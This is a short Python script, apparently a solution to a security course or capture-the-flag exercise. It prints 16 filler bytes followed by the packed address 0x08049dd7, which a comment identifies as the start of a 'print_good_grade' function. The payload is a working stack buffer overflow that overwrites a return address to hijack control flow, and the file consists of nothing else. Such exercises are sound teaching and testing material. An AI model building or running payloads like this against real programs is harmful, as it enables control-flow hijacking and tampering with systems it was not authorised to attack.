from struct import pack
import sys


# For reference:
# print_good_grade start address: 0x08049dd7


def main():

	sys.stdout.buffer.write(bytes.fromhex('30' * 16) + pack("<I", 0x08049dd7))



if __name__ == "__main__":
	main()